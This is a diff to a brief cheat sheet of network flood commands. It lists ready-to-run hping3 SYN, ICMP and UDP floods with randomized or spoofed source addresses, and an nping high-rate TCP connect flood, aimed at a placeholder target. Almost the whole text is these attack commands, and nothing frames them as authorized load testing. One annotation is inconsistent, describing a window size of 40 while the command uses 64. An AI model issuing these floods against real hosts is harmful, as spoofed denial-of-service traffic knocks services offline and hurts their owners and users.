@@ -1,14 +1,19 @@
 SYN/TCP Flood (-S), Random Source IP Spoof:
-# hping3 -S --flood --rand-source target.fqdn.or.ip
+hping3 -S --flood --rand-source target.fqdn.or.ip
+
 Better SYN/TCP Flood, set PUSH TCP flag (-P), set urgent URG TCP flag (-U), with Verbose output (-V):
-# hping3 -S --flood --rand-source -P -U -V target.fqdn.or.ip
+hping3 -S --flood --rand-source -P -U -V target.fqdn.or.ip
+
 ICMP Flood (-1), spoofing from IP 1.2.3.4 (-a)
-# hping3 -1 --flood -a 1.2.3.4 target.fqdn.or.ip
+hping3 -1 --flood -a 1.2.3.4 target.fqdn.or.ip
+
 UDP Flood (-2), targetting port 9000 (-p)
-# hping3 -2 --flood --rand-source -p 9000 target.fqdn.or.ip
+hping3 -2 --flood --rand-source -p 9000 target.fqdn.or.ip
+
 Default - send 100000 packets (-c), 120 byte-sized packet bodies (-d), 40 TCP window size (-w), SYN/TCP targetting port 21
-# hping3 -c 100000 -d 120 -S -w 64 -p 21 --flood --rand-source target.fqdn.or.ip
+hping3 -c 100000 -d 120 -S -w 64 -p 21 --flood --rand-source target.fqdn.or.ip
+
 Sample usage of nping instead:
-# nping --tcp-connect -rate=90000 -c 900000 -q target.fqdn.or.ip
+nping --tcp-connect -rate=90000 -c 900000 -q target.fqdn.or.ip
 
 slowloris for slowhttptest
